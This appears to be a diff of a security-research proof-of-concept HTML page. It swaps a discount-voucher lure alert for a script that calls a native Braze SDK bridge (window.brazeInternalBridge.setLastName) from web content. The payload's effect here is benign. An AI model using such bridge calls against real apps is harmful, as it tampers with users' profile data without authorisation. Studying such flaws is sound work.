@@ -25,7 +25,12 @@
         <div class="container">
             <div class="centered-div">
                 nop4tch
-                <script>alert("Enter your details to get a 100% discount voucher.")</script>
+                <script>
+                    if(window.brazeInternalBridge){
+                        window.brazeInternalBridge.setLastName("Gangsta");
+                        alert("Done!");
+                    }
+                </script>
             </div>
         </div>
     </body>
